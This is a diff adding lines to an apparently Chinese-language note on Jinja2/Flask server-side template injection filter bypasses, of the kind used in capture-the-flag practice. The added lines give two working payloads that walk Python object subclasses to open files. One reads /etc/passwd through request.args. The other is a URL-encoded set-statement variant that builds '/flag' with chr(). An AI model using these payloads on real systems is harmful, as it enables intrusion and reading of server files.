@@ -108,6 +108,17 @@ __init__.__globals__['__builtins__']
 __init__.__globals__.__builtins__
 ```
 
+使用"request.args" 或者 "request.values"
+python2 读举例
+```python
+?name={{().__class__.__bases__[0].__subclasses__()[40](request.args.aa).read()}}&aa=/etc/passwd
+```
+values 同理 数据为post
+
+还可用set 语句 由于{ 和%博客里连起来报错这里就用url编码了
+```python
+%7B%25set chr=[].__class__.__base__.__subclasses__()[61].__init__.__globals__.__builtins__.chr%25%7B{{[].__class__.__base__.__subclasses__()[40](chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()}}
+```
 
 
 
